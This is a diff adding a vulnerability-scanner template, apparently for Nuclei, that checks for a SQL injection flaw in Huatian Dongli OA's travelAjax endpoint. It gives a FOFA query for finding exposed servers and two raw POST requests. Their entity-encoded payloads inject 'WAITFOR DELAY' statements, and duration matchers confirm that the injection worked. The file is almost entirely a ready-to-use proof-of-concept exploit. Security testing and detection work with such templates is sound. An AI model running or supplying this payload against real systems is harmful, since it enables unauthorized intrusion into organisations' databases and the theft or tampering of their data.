@@ -1,0 +1,36 @@
+id: huatian-oa-travelajax-sqli
+info:
+  name: 华天动力OA travelAjax接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app" || body="/OAapp/WebObjects"
+      华天动力OA系统travelAjax接口存在SQL注入漏洞，攻击者可通过构造恶意输入参数在数据库层执行任意SQL命令，导致数据泄露、篡改或删除等安全风险。该漏洞源于接口未对用户输入进行充分的参数过滤与验证，允许注入恶意SQL语句。
+  tags: 华天动力OA
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/travelAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+        <buffalo-call>
+        <method>getLoanAmount</method>
+        <string>&#49;&apos;&#32;&#87;&#65;&#73;&#84;&#70;&#79;&#82;&#32;&#68;&#69;&#76;&#65;&#89;&#32;&apos;&#48;&#58;&#48;&#58;&#52;&apos;&#45;&#45;&#32;</string>
+        </buffalo-call>
+      - |
+        POST /OAapp/bfapp/buffalo/travelAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+        <buffalo-call>
+        <method>getLoanAmount</method>
+        <string>&#49;&apos;&#32;&#87;&#65;&#73;&#84;&#70;&#79;&#82;&#32;&#68;&#69;&#76;&#65;&#89;&#32;&apos;&#48;&#58;&#48;&#58;&#56;&apos;&#45;&#45;&#32;</string>
+        </buffalo-call>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
